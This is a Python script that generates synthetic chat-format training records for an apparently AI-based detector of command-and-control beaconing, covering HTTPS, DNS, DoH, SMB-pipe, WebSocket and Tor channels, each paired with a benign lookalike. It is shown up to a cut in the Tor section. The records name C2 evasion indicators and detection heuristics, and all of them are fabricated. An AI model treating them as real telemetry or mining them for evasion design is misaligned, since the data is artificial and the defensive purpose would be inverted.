"""
stage_c2_behavioral.py -- Comprehensive C2 TTP Behavioral Dataset

Tool class inventory (20 classes):
  Network channel patterns:
    HTTPSBeaconInterval    MalleableProfileMimicry   DNSSubdomainBeacon
    DoHBeaconChannel       SMBNamedPipeBeacon        WebSocketPersistentC2
    TorHiddenServiceC2     C2RedirectorPattern
  Host injection/evasion:
    RemoteProcessInjectionRWX  ProcessHollowing      IndirectSyscallStub
    SleepMaskingPattern        AMSIETWMemPatch        ReflectiveDLLLoad
    TokenDuplicationC2         ChromeExtensionC2
  Infrastructure signatures:
    TeamserverExposure    BeaconJitterStatistics
    StackCallSpoofing     HavocTeamsMimicry

Detection philosophy: behavioral evidence only -- timing ratios, memory patterns,
API call sequences, network characteristics. No framework names in detection
logic. Every class has admin FP variants.

Output:
  data/staging/c2_behavioral_v1.jsonl
  data/staging/c2_query_index.json

Usage:
    python stage_c2_behavioral.py
    python stage_c2_behavioral.py --records-per-class 15 --admin-fps-per-class 3
    python stage_c2_behavioral.py --tool-filter HTTPSBeaconInterval,SleepMaskingPattern
"""

import json
import random
import argparse
import logging
from pathlib import Path

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
logger = logging.getLogger("stage-c2")
random.seed(13)

OUTPUT_DIR  = Path("../data/staging")
OUTPUT_FILE = OUTPUT_DIR / "c2_behavioral_v1.jsonl"
INDEX_FILE  = OUTPUT_DIR / "c2_query_index.json"

SYS = {
    "network_tap": (
        "You are the Network Tap Forensics Expert. Analyze the session window "
        "using pre-computed fields (port_class, JA3, cert metadata, is_internal_dst, "
        "variance_inter_arrival, payload_entropy, byte_ratio). "
        "Attribute to MITRE ATT&CK and recommend containment."
    ),
    "sysmon_sensor": (
        "You are the Host Forensics Expert. Target OS: Windows. "
        "Vector Space: 6D windows_math. Source: Sysmon event stream. "
        "Schema: sysmon_event_id, Image, CommandLine, ParentImage, User, IntegrityLevel, "
        "TargetImage, GrantedAccess, TargetObject, ImageLoaded, Signed, PipeName, "
        "QueryName, TargetFilename, TamperingType. "
        "Identify C2 agent tradecraft. Output MITRE ATT&CK + containment."
    ),
    "windows_deepsensor": (
        "You are the Host Forensics Expert. Target OS: Windows. "
        "Vector Space: 6D windows_math. Schema: Image, CommandLine, ParentProcessName, "
        "TargetProcess, APISequence, MemoryPattern. "
        "Identify C2 agent tradecraft. Output MITRE ATT&CK + containment."
    ),
    "linux_sentinel": (
        "You are the Host Forensics Expert. Target OS: Linux/Unix. "
        "Vector Space: 5D sentinel_math. Schema: comm, command_line, uid, dest_ip, syscall. "
        "Identify C2 tradecraft. Output MITRE ATT&CK + containment."
    ),
}

VECTOR = {
    "network_tap":        "c2_math",
    "sysmon_sensor":      "windows_math",
    "windows_deepsensor": "deepsensor_math",
    "linux_sentinel":     "sentinel_math",
}

TTP_CAT = "C2"  # ttp_category field in every record

def _ip_int():  return f"10.{random.randint(0,10)}.{random.randint(1,254)}.{random.randint(1,254)}"
def _ip_ext():
    p = random.choice(["45.33","104.21","172.67","185.220","194.165","198.51"])
    return f"{p}.{random.randint(1,254)}.{random.randint(1,254)}"
def _host():    return f"{random.choice(['WS','SRV','APP','DC'])}-{random.randint(10,99)}"
def _user():    return random.choice(["jsmith","alee","tmorgan","schen","rbrown"])
def _asn():     return random.choice(["AS-CHOOPA Vultr","AS14061 DigitalOcean","AS16276 OVH",
                                       "AS47583 Hostinger","AS209 CenturyLink"])
def _ja3():     return f"{random.randint(10000000,99999999):08x}"
def _b64(n=20): return "".join(random.choices("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/", k=n)) + "=="

def _cot(a1, a2, a3, conclusion, technique, action="contain"):
    verdict = "TRUE POSITIVE" if action == "contain" else "FALSE POSITIVE"
    return (f"<analysis>\n[AXIS 1] Benign Alternative Assessment:\n  {a1}\n"
            f"[AXIS 2] Behavioral Proof Assessment:\n  {a2}\n"
            f"[AXIS 3] Entity Coverage:\n  {a3}\n"
            f"[CONCLUSION] {conclusion}\n</analysis>\n"
            f"{verdict}. {technique}\nRECOMMENDED_ACTION: {action}")

def _record(tool_class, sensor, mitre, msgs, cls, event_id=None):
    r = {"ttp_category": TTP_CAT, "tool_class": tool_class,
         "mitre_techniques": mitre, "source_type": sensor,
         "vector_name": VECTOR[sensor], "classification": cls,
         "messages": msgs}
    # event_id required by NexusMultimodalTrainer to look up vectors in safetensors
    if event_id is not None:
        r["event_id"] = event_id
    elif sensor in ("sysmon_sensor", "windows_deepsensor", "linux_sentinel", "macos_sensor"):
        # Generate a stable synthetic event_id for non-live records
        import hashlib
        r["event_id"] = hashlib.md5(f"{tool_class}_{cls}_{sensor}".encode()).hexdigest()[:16]
    return r

def _msg(sensor, user_text, asst_text):
    wrapped = (
        f"Spatial Anomaly Detected.\n"
        f"Source: {sensor}\n"
        f"Vector: <|spatial_vector|>\n"
        f"{user_text}"
    )
    return [{"role":"system","content":SYS[sensor]},
            {"role":"user","content":wrapped},
            {"role":"assistant","content":asst_text}]


# ═══════════════════════════════════════════════════════════════════════════════
# 1. HTTPSBeaconInterval
#    Evidence: machine-generated timing (low CV), POST to non-CDN external IP,
#              consistent payload size per session, port_class=c2-like,
#              self-signed cert with short validity
#    Covers: Havoc, Adaptix, Gunner, Tempest, Sliver, Drill, Viper
#    Admin FP: Application heartbeat / CDN health check
# ═══════════════════════════════════════════════════════════════════════════════

def _hbi_tp(i):
    interval  = random.randint(2, 300)
    cv        = round(random.uniform(0.0, 0.12), 4)
    jitter_pct= random.randint(0, 20)
    n_beacons = random.randint(20, 500)
    dst       = _ip_ext()
    port      = random.choice([443, 8443, 80, 4443, 8080])
    self_s    = i % 4 != 3
    cert_days = random.randint(1, 90) if self_s else random.randint(90, 730)
    payload_sz= random.randint(80, 600)
    method    = random.choice(["POST", "GET", "POST", "POST"])
    uri       = random.choice(["/api/v2/check", "/updates/sync", "/health/status",
                                "/telemetry/push", "/client/ping", "/collector/v1"])
    p = {
        "src": _ip_int(), "dst": dst, "port": port,
        "interval_s": interval, "cv": cv, "jitter_pct": jitter_pct,
        "beacon_count": n_beacons, "payload_size_bytes": payload_sz,
        "method": method, "uri": uri,
        "self_signed": self_s, "cert_valid_days": cert_days,
        "dst_asn": _asn(), "ja3": _ja3(), "port_class": "c2-like",
        "is_internal_dst": False,
        "time_of_day": random.choice(["03:47", "01:23", "22:15", "04:02"])
    }
    prompt = (f"Network Tap -- HTTPS Beacon Activity.\n"
              f"Source: {p['src']} → {p['dst']}:{p['port']}\n"
              f"  beacon_count={p['beacon_count']}  interval_s={p['interval_s']}\n"
              f"  variance_inter_arrival={p['cv']:.4f}  jitter_pct_observed={p['jitter_pct']}\n"
              f"  http_method={p['method']}  uri={p['uri']}\n"
              f"  payload_size_bytes={p['payload_size_bytes']} (consistent)\n"
              f"  cert_self_signed={p['self_signed']}  cert_valid_days={p['cert_valid_days']}\n"
              f"  dst_asn={p['dst_asn']}  JA3={p['ja3']}\n"
              f"  port_class={p['port_class']}  is_internal_dst={p['is_internal_dst']}\n"
              f"  observation_window_first_seen={p['time_of_day']}")
    cot = _cot(
        f"Monitoring agents and CDN health checks produce regular outbound HTTPS -- but they "
        f"target registered vendor domains with CA-signed certificates, not commodity VPS "
        f"infrastructure. Real health checks have bounded session counts and business-hours activity.",
        f"variance_inter_arrival={p['cv']:.4f} (near zero = machine-generated, not human-driven). "
        f"beacon_count={p['beacon_count']} identical {p['method']} requests to {p['uri']} "
        f"at {p['interval_s']}s ± {p['jitter_pct']}% = automated beacon loop. "
        + (f"cert_self_signed=True, valid_days={p['cert_valid_days']} (attacker-generated infra). " if p['self_signed'] else "")
        + f"dst={p['dst_asn']} (commodity VPS, not CDN or enterprise infrastructure). "
        f"payload_size consistent ({p['payload_size_bytes']}B) = structured protocol, not user data. "
        f"First seen {p['time_of_day']} (off-hours = no user session active).",
        f"Host {p['src']} is beaconing to C2 infrastructure at {p['dst']}:{p['port']}. "
        f"At {p['interval_s']}s interval, attacker receives callback every session. "
        "Beacon survives sleep/shutdown via reconnect logic.",
        "HTTPS C2 beacon confirmed -- machine interval + VPS destination + consistent payload size.",
        "MITRE T1071.001 (Web Protocols) + T1573.001 (Encrypted Channel: Symmetric). "
        "Block destination IP, isolate source host, capture beacon pcap.",
    )
    return prompt, cot, "true_positive"

def _hbi_fp(i):
    vendor = random.choice(["Datadog","New Relic","Dynatrace","Elastic APM"])
    p = {"dst": f"intake.{vendor.lower().replace(' ','')}.com",
         "interval_s": random.randint(30, 60), "cv": round(random.uniform(0.15, 0.40), 3),
         "cert": f"{vendor} CA", "asn": "AWS CloudFront", "port": 443}
    prompt = (f"Network Tap -- APM Agent Telemetry.\n"
              f"  destination={p['dst']}:{p['port']}\n"
              f"  interval_s={p['interval_s']}  variance_inter_arrival={p['cv']:.3f}\n"
              f"  cert_issuer={p['cert']}  dst_asn={p['asn']}\n"
              f"  vendor_registered=YES  agent_config_on_disk=YES")
    cot = _cot(
        f"{vendor} APM agent -- registered vendor domain, CA-signed cert, CDN-hosted endpoint.",
        f"dst={p['dst']} (vendor FQDN, not raw IP). cert_issuer={p['cert']} (CA-signed). "
        f"cv={p['cv']:.3f} (human+jitter, not machine precision). {p['asn']} (CDN, not VPS).",
        "Authorized APM telemetry -- registered vendor, CA cert, CDN endpoint.",
        "Authorized APM telemetry. No action.",
        "T1071.001 -- AUTHORIZED APM AGENT. No action.",
        action="dismiss",
    )
    return prompt, cot, "false_positive"


# ═══════════════════════════════════════════════════════════════════════════════
# 2. MalleableProfileMimicry
#    Evidence: spoofed service headers (Teams x-ms-session-id GUID,
#              Gmail OSID cookie, Amazon x-amz-id), URI matches CDN/app
#              pattern but destination is not that service, mandatory header
#              enforcement (missing = 404)
#    Covers: Cobalt Strike Malleable C2, Havoc Teams profile
#    Admin FP: Actual Teams/Gmail traffic from browser
# ═══════════════════════════════════════════════════════════════════════════════

_PROFILES = [
    ("Teams", "/Collector/2.0/settings/",
     {"x-ms-session-id": lambda: str(random.randint(10**15, 10**16)),
      "x-ms-client-type": "desktop",
      "x-ms-environment": "prod",
      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Teams/1.6"},
     "GSE"),
    ("Gmail", "/mail/u/0/",
     {"Cookie": f"OSID={_b64(24)}; GMAIL_AT={_b64(16)}",
      "Cache-Control": "no-cache",
      "User-Agent": "Mozilla/5.0 (Windows NT; rv:109.0) Gecko Firefox"},
     "GSE"),
    ("Amazon", f"/s/ref=nb_sb_noss_1/{_b64(6)}/field-keywords=books",
     {"Cookie": f"session-token={_b64(40)}; skin=noskin",
      "x-amz-id-1": _b64(16),
      "x-amz-id-2": _b64(24)},
     "CloudFront"),
]

def _mpm_tp(i):
    svc_name, uri, headers, server = _PROFILES[i % len(_PROFILES)]
    dst = _ip_ext()
    p = {
        "src": _ip_int(), "dst": dst, "port": 443,
        "service_name": svc_name, "uri": uri,
        "spoofed_headers": headers,
        "server_header": server,
        "dst_asn": _asn(),
        "dst_is_known_service": False,
        "cert_self_signed": True,
        "mandatory_header_enforce": True,
        "non_matching_req_returns_404": True,
    }
    hdr_str = "  " + "\n  ".join(f"{k}: {v}" for k, v in list(headers.items())[:3])
    prompt = (f"Network Tap -- Service Impersonation C2 Profile.\n"
              f"Source: {p['src']} → {p['dst']}:{p['port']}\n"
              f"  http_uri: {p['uri']}\n"
              f"  spoofed_service: {p['service_name']}\n"
              f"  http_headers:\n{hdr_str}\n"
              f"  response_Server_header: {p['server_header']}\n"
              f"  dst_asn: {p['dst_asn']}\n"
              f"  dst_is_known_{p['service_name'].lower()}_ip: {p['dst_is_known_service']}\n"
              f"  cert_self_signed: {p['cert_self_signed']}\n"
              f"  non_matching_request_returns_404: {p['non_matching_req_returns_404']}")
    cot = _cot(
        f"Microsoft Teams traffic goes to Microsoft-owned IP space (AS8075). Gmail goes to "
        f"Google AS (AS15169). Amazon to AS16509. The destination IP {dst} is on {p['dst_asn']} -- "
        "a commodity hosting provider, not the service being impersonated.",
        f"URI='{p['uri']}' + headers matching {p['service_name']} protocol -- but "
        f"dst_is_known_{p['service_name'].lower()}_ip=False. "
        f"cert_self_signed=True ({p['service_name']} uses Microsoft/Google PKI, not self-signed). "
        f"dst_asn={p['dst_asn']} (not {p['service_name']} infrastructure). "
        f"non_matching_request=404 (strict server-side validation = C2 profile enforcing header contract). "
        "Header combination cannot coexist with wrong destination AS -- definitional profile mimicry.",
        f"Host {p['src']}: C2 beacon disguised as {p['service_name']} traffic. "
        "NDR rules filtering on URI/headers alone will pass this as legitimate. "
        "Destination IP correlation is the key discriminator.",
        f"Malleable C2 profile mimicking {p['service_name']} confirmed -- header/URI combination with wrong destination AS.",
        "MITRE T1071.001 (Web Protocols) + T1001.003 (Protocol Impersonation). "
        f"Block destination IP, alert on {p['service_name']}-pattern traffic to non-{p['service_name']}-AS.",
    )
    return prompt, cot, "true_positive"

def _mpm_fp(i):
    svc = random.choice(["Teams","Gmail"])
    p = {"svc": svc,
         "dst": f"{'teams' if svc=='Teams' else 'mail'}.{'microsoft' if svc=='Teams' else 'google'}.com",
         "asn": "AS8075 Microsoft" if svc == "Teams" else "AS15169 Google",
         "cert": "Microsoft IT TLS CA" if svc == "Teams" else "GTS CA 1C3"}
    prompt = (f"Network Tap -- {p['svc']} Application Traffic.\n"
              f"  dst={p['dst']}:443  dst_asn={p['asn']}\n"
              f"  cert_issuer={p['cert']}  cert_self_signed=NO\n"
              f"  browser_parent=YES  user_session_active=YES")
    cot = _cot(
        f"Actual {p['svc']} traffic: destination on {p['asn']}, CA-signed cert, browser parent, active user session.",
        f"dst={p['dst']} (owned by vendor). asn={p['asn']}. cert={p['cert']} (CA-signed). Browser parent.",
        f"Authorized {p['svc']} usage -- vendor IP, CA cert, browser.",
        f"Authorized {p['svc']} application traffic. No action.",
        "T1071.001 -- AUTHORIZED APPLICATION. No action.",
        action="dismiss",
    )
    return prompt, cot, "false_positive"


# ═══════════════════════════════════════════════════════════════════════════════
# 3. DNSSubdomainBeacon
#    Evidence: high-entropy subdomain labels, regular interval DNS queries,
#              TXT record queries for data exfil, abnormal NXDOMAIN rate,
#              domain registered recently, payload in subdomain length
#    Admin FP: CDN with many subdomains (Cloudflare, Akamai)
# ═══════════════════════════════════════════════════════════════════════════════

def _dsb_tp(i):
    domain    = f"{_b64(8).lower().replace('=','').replace('+','-').replace('/','x')}.com"
    n_queries = random.randint(50, 500)
    interval  = random.randint(5, 60)
    cv        = round(random.uniform(0.0, 0.10), 4)
    entropy   = round(random.uniform(3.5, 5.0), 3)
    nxdomain  = round(random.uniform(0.0, 0.25), 3)
    txt_pct   = round(random.uniform(0.2, 0.8), 3)
    p = {
        "src": _ip_int(), "domain": domain,
        "n_queries": n_queries, "interval_s": interval, "cv": cv,
        "subdomain_entropy": entropy, "nxdomain_rate": nxdomain,
        "txt_query_pct": txt_pct,
        "subdomain_examples": [f"{_b64(12).lower()[:16]}.{domain}" for _ in range(3)],
        "domain_age_days": random.randint(1, 30),
        "ttl_seconds": random.randint(0, 30),
    }
    prompt = (f"Network Tap -- DNS Subdomain Beacon / Exfil.\n"
              f"Source: {p['src']}\n"
              f"  domain: {p['domain']}  domain_age_days={p['domain_age_days']}\n"
              f"  total_dns_queries={p['n_queries']}  interval_s={p['interval_s']}\n"
              f"  variance_inter_arrival={p['cv']:.4f}\n"
              f"  subdomain_label_entropy={p['subdomain_entropy']:.3f}\n"
              f"  nxdomain_rate={p['nxdomain_rate']:.1%}  txt_query_pct={p['txt_query_pct']:.1%}\n"
              f"  ttl_seconds={p['ttl_seconds']}\n"
              f"  sample_subdomains: {p['subdomain_examples'][0]}")
    cot = _cot(
        f"CDNs generate dynamic subdomains (client-specific, geographic) but these are derived from "
        "fixed templates, not random-looking base64 strings. CDN TXT queries are DKIM/SPF lookups "
        "for specific records, not repeated high-entropy queries.",
        f"subdomain_entropy={p['subdomain_entropy']:.3f} (values >3.5 indicate encoded data, not human-readable subdomains). "
        f"interval_cv={p['cv']:.4f} (machine-generated DNS polling loop). "
        f"txt_query_pct={p['txt_query_pct']:.0%} (TXT queries for data retrieval = C2 command channel). "
        f"ttl={p['ttl_seconds']}s (near-zero TTL prevents caching = command channel freshness). "
        f"domain_age={p['domain_age_days']}d (freshly registered for this campaign). "
        f"Sample: '{p['subdomain_examples'][0]}' -- base64-encoded payload in subdomain label.",
        f"Host {p['src']} is using DNS as a covert C2 channel to {p['domain']}. "
        "Commands arrive in DNS responses; data exfiltrates in subdomain labels. "
        "Bypasses HTTP/HTTPS inspection; works through most firewalls.",
        "DNS subdomain C2 beacon confirmed -- encoded data in subdomain labels.",
        "MITRE T1071.004 (DNS) + T1048.003 (Exfiltration Over Unencrypted Protocol). "
        "Block domain at DNS resolver, capture full DNS query logs.",
    )
    return prompt, cot, "true_positive"

def _dsb_fp(i):
    p = {"domain": "cloudflare.net", "entropy": round(random.uniform(1.5, 2.5), 3),
         "asn": "AS13335 Cloudflare", "type": "CDN edge assignment"}
    prompt = (f"Network Tap -- CDN DNS Traffic.\n"
              f"  domain={p['domain']}  type={p['type']}\n"
              f"  subdomain_entropy={p['entropy']:.3f}  asn={p['asn']}\n"
              f"  txt_queries=DKIM_only  ttl=300s  domain_age=years")
    cot = _cot(
        f"Cloudflare CDN dynamic subdomains -- entropy from geographic/session tokens, not encoded data.",
        f"entropy={p['entropy']:.3f} (within normal CDN range). DKIM TXT only. ttl=300s. Long-registered domain.",
        "Authorized CDN traffic -- established domain, normal entropy, DKIM TXT queries only.",
        "Authorized CDN DNS traffic. No action.",
        "T1071.004 -- AUTHORIZED CDN. No action.",
        action="dismiss",
    )
    return prompt, cot, "false_positive"


# ═══════════════════════════════════════════════════════════════════════════════
# 4. DoHBeaconChannel
#    Evidence: HTTPS POST to public DoH resolvers (1.1.1.1, 8.8.8.8, 9.9.9.9)
#              with application/dns-message content-type, very short interval,
#              TXT record queries in DNS payload, non-browser parent process
#    Covers: agent-loader DoH C2 (5s hardcoded interval)
#    Admin FP: Browser-native DoH (Firefox, Chrome -- browser parent, standard queries)
# ═══════════════════════════════════════════════════════════════════════════════

def _doh_tp(i):
    resolvers = ["1.1.1.1", "8.8.8.8", "9.9.9.9", "149.112.112.112"]
    resolver  = random.choice(resolvers)
    n_queries = random.randint(100, 1000)
    interval  = random.randint(3, 10)
    cv        = round(random.uniform(0.01, 0.06), 4)
    txt_pct   = round(random.uniform(0.4, 0.9), 3)
    parent    = random.choice(["powershell.exe","python.exe","svchost.exe","unknown.exe","cmd.exe"])
    p = {
        "src": _ip_int(), "resolver": resolver, "port": 443,
        "n_queries": n_queries, "interval_s": interval, "cv": cv,
        "content_type": "application/dns-message",
        "txt_query_pct": txt_pct, "parent": parent,
        "total_post_bytes": random.randint(5000, 50000),
    }
    prompt = (f"Network Tap -- DNS-over-HTTPS C2 Channel.\n"
              f"Source: {p['src']} → {p['resolver']}:443 (public DoH resolver)\n"
              f"  http_method=POST  content_type={p['content_type']}\n"
              f"  total_doh_requests={p['n_queries']}  interval_s={p['interval_s']}\n"
              f"  variance_inter_arrival={p['cv']:.4f}\n"
              f"  txt_record_query_pct={p['txt_query_pct']:.0%}\n"
              f"  total_post_bytes={p['total_post_bytes']:,}\n"
              f"  initiating_process={p['parent']}\n"
              f"  browser_session_active=NO")
    cot = _cot(
        "Browsers use DoH when configured (Firefox, Chrome) but their query patterns reflect "
        "user browsing: diverse domains, irregular timing, A/AAAA record types dominant. "
        f"A non-browser process ({p['parent']}) issuing {p['n_queries']} DoH requests at "
        f"{p['interval_s']}s ± {p['cv']:.4f} with {p['txt_query_pct']:.0%} TXT queries is not browser behavior.",
        f"parent={p['parent']} (not a browser -- DoH from non-browser process is anomalous). "
        f"interval_cv={p['cv']:.4f} (machine-generated). "
        f"txt_pct={p['txt_query_pct']:.0%} (TXT = command channel; browsers rarely query TXT records). "
        f"{p['n_queries']} requests in window (sustained query loop). "
        "DoH disguises DNS traffic inside HTTPS to bypass DNS-layer inspection.",
        f"Host {p['src']}: DoH channel provides covert C2 that bypasses all "
        "DNS-layer controls. Commands arrive in TXT record values; beaconing at "
        f"{p['interval_s']}s interval confirms persistent agent.",
        "DNS-over-HTTPS C2 command channel confirmed -- non-browser DoH with TXT queries.",
        "MITRE T1071.004 (DNS) + T1090.003 (Protocol Tunneling via DoH). "
        "Block DoH from non-browser processes at firewall, inspect DNS traffic.",
    )
    return prompt, cot, "true_positive"

def _doh_fp(i):
    p = {"resolver": "1.1.1.1", "parent": "firefox.exe",
         "interval": "irregular", "txt_pct": 0.02}
    prompt = (f"Network Tap -- Browser DoH Traffic.\n"
              f"  dst=1.1.1.1:443  parent={p['parent']}\n"
              f"  interval={p['interval']}  txt_pct={p['txt_pct']:.0%}\n"
              f"  browser_session_active=YES  query_types=A,AAAA_dominant")
    cot = _cot(
        "Firefox DoH -- browser parent, irregular timing from user navigation, A/AAAA dominant.",
        f"parent=firefox.exe (browser). timing=irregular (user-driven). txt_pct={p['txt_pct']:.0%} (normal).",
        "Authorized browser-native DoH -- Firefox, irregular user-driven timing.",
        "Authorized browser DoH. No action.",
        "T1071.004 -- AUTHORIZED BROWSER DOH. No action.",
        action="dismiss",
    )
    return prompt, cot, "false_positive"


# ═══════════════════════════════════════════════════════════════════════════════
# 5. SMBNamedPipeBeacon
#    Evidence: Named pipe creation from unexpected process, cross-host pipe
#              connection for C2 (lateral movement), pipe name heuristics
#              (random/generic vs. vendor-specific)
#    Covers: Havoc SMB, Adaptix SMB, Cobalt Strike SMB beacon
#    Admin FP: SQL Server named pipe (MSSQL, expected service account)
# ═══════════════════════════════════════════════════════════════════════════════

def _smb_pipe_tp(i):
    pipe_names = ["demon_pipe", "mojo.5688.8192", "TSVCPIPE-12345678",
                  "msagent_bf", "spoolss_ext", "ntsvcs_x64"]
    p = {
        "src": _ip_int(), "dst": _ip_int(),
        "pipe_name": random.choice(pipe_names),
        "creating_process": random.choice(["powershell.exe","notepad.exe","svchost.exe","werfault.exe"]),
        "pipe_direction": "INBOUND_OUTBOUND",
        "cross_host": i % 2 == 0,
        "injection_parent": "explorer.exe",
        "interval_s": random.randint(5, 30),
        "cv": round(random.uniform(0.01, 0.10), 4),
        "data_transferred_kb": random.randint(1, 50),
    }
    prompt = (f"Windows Host + Network Tap -- SMB Named Pipe C2.\n"
              f"Host: {p['src']}\n"
              f"  pipe_created: \\\\.\\pipe\\{p['pipe_name']}\n"
              f"  creating_process: {p['creating_process']}\n"
              f"  cross_host_pipe_access: {'YES → ' + p['dst'] if p['cross_host'] else 'local only'}\n"
              f"  beacon_interval_s={p['interval_s']}  cv={p['cv']:.4f}\n"
              f"  data_transferred_kb={p['data_transferred_kb']}\n"
              f"  port=445  protocol=SMB")
    lateral_note = (f"Cross-host named pipe access to {p['dst']} -- lateral C2 propagation using "
                    "SMB. Attacker uses this host as a C2 relay." if p['cross_host']
                    else "Local named pipe -- direct implant beacon channel.")
    cot = _cot(
        "Legitimate named pipes are created by vendor services (SQL Server: \\MSSQL$<inst>, "
        "Spooler: \\spoolss, Print: \\pipe\\Printer). A pipe named 'demon_pipe' or random-looking "
        f"strings created by {p['creating_process']} has no vendor precedent.",
        f"pipe_name='{p['pipe_name']}' (not a recognized vendor pipe format). "
        f"creating_process={p['creating_process']} (not a pipe-server service). "
        f"beacon_cv={p['cv']:.4f} (machine-generated read/write cycle). "
        f"{lateral_note}",
        f"Host {p['src']}: SMB named pipe provides C2 channel that passes through firewall "
        "rules allowing SMB (port 445). "
        + (f"Pivot to {p['dst']} via pipe extends C2 reach inside the network." if p['cross_host'] else ""),
        "SMB named pipe C2 beacon confirmed.",
        "MITRE T1071.002 (File Transfer Protocols via SMB) + T1090 (Proxy via Named Pipe). "
        "Block outbound SMB from workstations, audit named pipe creation.",
    )
    return prompt, cot, "true_positive"

def _smb_pipe_fp(i):
    p = {"pipe": "MSSQL$PROD\\sql\\query", "creator": "sqlservr.exe",
         "sa": "NT SERVICE\\MSSQLSERVER"}
    prompt = (f"Windows Host -- SQL Server Named Pipe.\n"
              f"  pipe_name: \\\\.\\pipe\\{p['pipe']}\n"
              f"  creating_process: {p['creator']}  service_account={p['sa']}\n"
              f"  vendor=Microsoft_SQL_Server  cmdb_registered=YES")
    cot = _cot(
        "SQL Server named pipe -- vendor-format name, sqlservr.exe creator, MSSQL service account.",
        f"pipe=MSSQL$PROD\\sql\\query (vendor format). creator=sqlservr.exe. sa={p['sa']}. CMDB.",
        "Authorized SQL Server named pipe connection.",
        "Authorized SQL Server named pipe. No action.",
        "T1071.002 -- AUTHORIZED SQL SERVER PIPE. No action.",
        action="dismiss",
    )
    return prompt, cot, "false_positive"


# ═══════════════════════════════════════════════════════════════════════════════
# 6. WebSocketPersistentC2
#    Evidence: WebSocket Upgrade from non-browser process, persistent bidirectional
#              connection, message interval pattern (Gunner 6060, Drill SocketIO),
#              Server: uvicorn/fastapi or SocketIO headers
#    Admin FP: Legitimate WebSocket app (Slack, VS Code live share)
# ═══════════════════════════════════════════════════════════════════════════════

def _ws_tp(i):
    ports   = [6060, 8765, 9090, 4747, 2112]
    servers = ["uvicorn", "socket.io", "actix-web", "nodejs/express", "python-tornado"]
    p = {
        "src": _ip_int(), "dst": _ip_ext(), "port": random.choice(ports),
        "server_header": random.choice(servers),
        "duration_h": round(random.uniform(0.5, 24.0), 1),
        "message_interval_s": random.randint(5, 30),
        "cv": round(random.uniform(0.01, 0.09), 4),
        "msg_count": random.randint(50, 2000),
        "upgrade_from": random.choice(["powershell.exe","python.exe","svchost.exe","unknown.exe"]),
        "is_internal_dst": False,
        "tls": i % 3 != 0,
    }
    prompt = (f"Network Tap -- WebSocket Persistent C2 Channel.\n"
              f"Source: {p['src']} → {p['dst']}:{p['port']} ({'WSS' if p['tls'] else 'WS'})\n"
              f"  WebSocket_Upgrade=YES  session_duration_h={p['duration_h']}\n"
              f"  message_interval_s={p['message_interval_s']}  cv={p['cv']:.4f}\n"
              f"  total_messages={p['msg_count']}\n"
              f"  server_header={p['server_header']}\n"
              f"  initiating_process={p['upgrade_from']}\n"
              f"  is_internal_dst={p['is_internal_dst']}  port_class=c2-like")
    cot = _cot(
        "Slack, VS Code Live Share, and similar WebSocket apps are browser-initiated, "
        "connect to vendor FQDNs with CA-signed certs, and have human-driven message timing. "
        f"A non-browser process initiating WebSocket to an external VPS at {p['port']} is not any of these.",
        f"upgrade_from={p['upgrade_from']} (not a browser -- WebSocket from script/service is anomalous). "
        f"dst is raw external IP, port {p['port']} (not a registered service port). "
        f"server={p['server_header']} (development framework, not a commercial WebSocket service). "
        f"cv={p['cv']:.4f} (machine-generated message timing). "
        f"session_duration={p['duration_h']}h (persistent bidirectional command channel).",
        f"Host {p['src']}: WebSocket provides full-duplex C2 channel over a single persistent "
        "connection. Commands pushed in real-time without beacon timing constraints.",
        "WebSocket persistent C2 confirmed -- non-browser upgrade to VPS development server.",
        "MITRE T1071.001 (Web Protocols via WebSocket). Block destination, isolate host.",
    )
    return prompt, cot, "true_positive"

def _ws_fp(i):
    p = {"dst": "app.slack.com", "port": 443, "parent": "Slack.exe",
         "server": "slack-edge", "asn": "AS15169 Google Cloud (Slack-hosted)"}
    prompt = (f"Network Tap -- Slack WebSocket Session.\n"
              f"  dst={p['dst']}:{p['port']}  server={p['server']}\n"
              f"  parent={p['parent']}  asn={p['asn']}\n"
              f"  cert_issuer=DigiCert  user_session_active=YES")
    cot = _cot(
        "Slack WebSocket -- vendor FQDN, DigiCert cert, Slack.exe parent, user session active.",
        f"dst=app.slack.com (vendor FQDN). cert=DigiCert. parent=Slack.exe. User active.",
        "Authorized Slack application WebSocket session.",
        "Authorized Slack WebSocket. No action.",
        "T1071.001 -- AUTHORIZED SLACK SESSION. No action.",
        action="dismiss",
    )
    return prompt, cot, "false_positive"


# ═══════════════════════════════════════════════════════════════════════════════
# 7. TorHiddenServiceC2
#    Evidence: TCP connections to known Tor guard/exit node IP ranges,
#              characteristic Tor TLS handshake (specific cipher suites),
#              Tor control port activity, onion service resolution attempts
#    Covers: OnionC2 (Arti library), any Tor-routed C2
#    Admin FP: No legitimate corporate use case for Tor exit connections
# ═══════════════════════════════════════════════════════════════════════════════

def _tor_tp(i):
    p = {
        "src": _ip_int(),
        "tor_exit_or_guard": _ip_ext(),
        "port": random.choice([9001, 9030, 443, 80]),
        "tor_consensus_hit": True,
        "circuit_count": random.randint(2, 8),
        "onion_resolution": i % 2 == 0,
        "control_port": 9051 if i % 3 == 0 else None,
        "arti_library": i % 2 == 0,
        "session_duration_h": round(random.uniform(0.5, 6.0), 1),
    }
    prompt = (f"Network Tap -- Tor C2 Channel.\n"
              f"Source: {p['src']} → Tor exit/guard node: {p['tor_exit_or_guard']}:{p['port']}\n"
              f"  ip_in_tor_consensus_list=YES\n"
              f"  tor_circuits_established={p['circuit_count']}\n"
              f"  onion_service_resolution={'YES' if p['onion_resolution'] else 'NO'}\n"
              + (f"  tor_control_port_activity=YES (port {p['control_port']})\n" if p['control_port'] else "")
              + (f"  arti_rust_library_detected=YES\n" if p['arti_library'] else "")
              + f"  session_duration_h={p['session_duration_h']}")
    cot = _cot(
        "There is no legitimate enterprise use case for connecting to Tor guard or exit nodes. "
        "Privacy-oriented developers might use Tor personally, but corporate endpoints should not "
        "establish Tor circuits without explicit written authorization.",
        f"dst IP {p['tor_exit_or_guard']} appears in Tor consensus list (confirmed Tor node). "
        f"{p['circuit_count']} Tor circuits established -- onion routing in progress. "
        + ("Onion service resolution attempted -- connecting to a .onion hidden service (C2 infrastructure). " if p['onion_resolution'] else "")
        + (f"Tor control port activity (port {p['control_port']}) -- local Tor daemon managing circuits. " if p['control_port'] else "")
